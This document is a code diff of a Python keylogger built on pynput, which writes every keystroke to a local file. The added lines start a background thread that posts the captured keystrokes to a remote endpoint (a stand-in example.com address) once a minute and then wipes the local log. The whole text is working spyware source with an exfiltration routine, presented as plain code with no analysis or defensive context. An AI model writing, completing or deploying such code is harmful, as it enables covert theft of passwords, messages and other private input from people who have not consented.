@@ -1,16 +1,35 @@
 from pynput import keyboard
+import threading
+import requests
+import time
 
-# File where logs will be saved
 log_file = "qwerty.txt"
+send_interval = 60  # seconds
+endpoint_url = "https://example.com/receive_logs" 
+# Function to send the log file contents
+def send_logs():
+    while True:
+        time.sleep(send_interval)
+        try:
+            with open(log_file, "r") as f:
+                data = f.read()
+            if data:
+                response = requests.post(endpoint_url, data={"log": data})
+                print("Data sent:", response.status_code)
+                open(log_file, "w").close()  # Clear the log after sending
+        except Exception as e:
+            print("Error sending logs:", e)
 
+# Start the sending thread
+threading.Thread(target=send_logs, daemon=True).start()
+
+# Keylogger logic
 def on_press(key):
     try:
         with open(log_file, "a") as f:
-            # Regular character keys
             f.write(f"{key.char}")
     except AttributeError:
         with open(log_file, "a") as f:
-            # Handle special keys
             if key == keyboard.Key.space:
                 f.write(" [SPACE] ")
             elif key == keyboard.Key.enter:
@@ -25,10 +44,9 @@ def on_press(key):
                 f.write(f" [{key}] ")
 
 def on_release(key):
-    # Stop the listener when ESC is pressed
     if key == keyboard.Key.esc:
         return False
 
-# Start listening to keyboard events
+# Start the key listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
